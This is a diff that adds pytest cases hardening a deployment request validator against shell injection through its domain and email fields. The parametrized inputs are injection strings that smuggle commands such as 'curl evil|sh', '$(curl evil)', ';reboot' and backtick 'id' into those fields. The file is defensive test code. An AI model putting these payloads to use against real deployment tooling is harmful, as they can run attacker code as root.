@@ -94,3 +94,33 @@ def test_invalid_ip_rejected():
 def test_whitelist_ips_accepts_freeform():
     r = DeployRequest(**_remna(whitelist_ips="1.2.3.4, 10.0.0.0/24 garbage"))
     assert r.whitelist_ips == "1.2.3.4, 10.0.0.0/24 garbage"
+
+
+# ── shell-injection hardening: domain/email are interpolated into root bash ──
+
+@pytest.mark.parametrize("bad", [
+    'node.evil.com"; curl evil|sh #',
+    "node.evil.com$(curl evil)",
+    "node.evil.com;reboot",
+    "node.evil.com`id`",
+    "a b.com",
+    "node.evil.com\ncurl evil|sh",
+])
+def test_domain_rejects_shell_metacharacters(bad):
+    with pytest.raises(ValidationError):
+        DeployRequest(**_remna(domain=bad))
+
+
+@pytest.mark.parametrize("bad", [
+    'a@b.co"; curl evil|sh #',
+    "x;curl evil|sh;@b.co",
+    "a$(id)@b.co",
+    "a@b.co`id`",
+])
+def test_email_rejects_shell_metacharacters(bad):
+    with pytest.raises(ValidationError):
+        DeployRequest(**_remna(email=bad))
+
+
+def test_domain_and_email_valid_forms_pass():
+    DeployRequest(**_remna(domain="sub.node-1.example.com", email="a.b+tag@ex-ample.co"))
